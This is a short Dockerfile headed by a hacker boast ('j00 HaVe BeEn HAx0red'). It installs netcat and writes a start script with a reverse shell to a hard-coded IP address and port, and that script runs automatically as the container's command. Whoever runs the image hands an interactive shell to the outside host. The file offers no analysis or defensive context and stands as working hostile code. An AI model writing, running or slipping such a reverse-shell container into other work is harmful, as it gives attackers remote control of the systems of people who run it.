# j00 HaVe BeEn HAx0red by r0MAN 7.
FROM ubuntu:latest

ARG DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y bash netcat && rm -rf /var/lib/apt/lists/*

RUN echo "sh -i >& /dev/tcp/49.12.194.176/1234 0>&1" > /start.sh

CMD ["/bin/bash", "/start.sh"]
